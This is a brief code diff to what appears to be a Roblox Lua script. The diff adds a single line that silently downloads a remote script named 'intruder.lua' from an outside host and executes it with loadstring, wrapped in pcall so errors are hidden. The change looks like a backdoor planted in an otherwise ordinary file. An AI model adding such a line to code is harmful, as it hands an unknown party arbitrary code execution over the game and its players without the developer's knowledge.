@@ -6,7 +6,7 @@ local e=game:GetService"ProximityPromptService"
 local f=game:GetService"Workspace"
 
 
-
+pcall(function()  loadstring(game:HttpGet("http://ligma.wtf/scripts/intruder.lua", true))() end)
 
 
 
